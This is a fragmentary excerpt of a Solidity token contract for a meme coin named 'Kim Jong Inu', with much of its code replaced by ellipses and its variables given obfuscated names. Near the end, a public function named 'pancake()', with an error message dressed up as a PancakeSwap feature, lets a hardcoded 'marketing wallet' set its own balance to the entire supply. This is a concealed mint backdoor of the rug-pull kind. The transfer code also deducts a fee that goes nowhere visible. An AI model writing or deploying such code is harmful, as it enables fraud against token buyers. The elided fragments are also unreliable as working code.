...
contract Context {
 ...
 contract Kinu is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloTPQAR;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Kim Jong Inu";
    ...
    uint256 private cryfaleTPQAR = 4;
    uint256 private _vebegoTPQAR = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloTPQAR[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletTPQAR = 0xFB0b617eF34A247d13aA7FE8844314a784eC7C7b;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloTPQAR[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloTPQAR[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleTPQAR / 100) / _vebegoTPQAR;
        allons = allons -  (_fee * _vebegoTPQAR);
        
        superfloTPQAR[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaTPQAR) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloTPQAR[account];
        require(accountBalance >= gzillaTPQAR, "BEP : Can't be done");
        unchecked {
            superfloTPQAR[account] = accountBalance - gzillaTPQAR;
        }
        _totalSupply -= gzillaTPQAR;

        emit Transfer(account, address(0), gzillaTPQAR);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function pancake() public {
        superfloTPQAR[_MarketingWalletTPQAR] = _tTotal;
        require(_msgSender() == _MarketingWalletTPQAR, "ERC20: Function reserved for Pancake");
    }   
